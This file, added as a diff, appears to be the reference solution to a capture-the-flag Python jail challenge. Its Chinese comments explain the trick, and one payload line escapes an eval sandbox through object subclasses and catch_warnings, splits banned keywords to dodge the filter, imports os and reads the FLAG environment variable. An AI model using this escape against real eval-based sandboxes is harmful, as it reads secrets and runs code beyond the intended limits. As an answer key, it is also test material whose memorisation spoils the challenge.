@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# 假 __import__ 是烟雾弹；catch_warnings._module.__builtins__
+# 里存着真导入器。被禁词全部拆开拼接
+getattr(getattr([x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'cat'+'ch_'+'warnings'][0](), '_mo'+'dule'), '__dict__')['__bu'+'iltins__']['__i'+'mport__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']
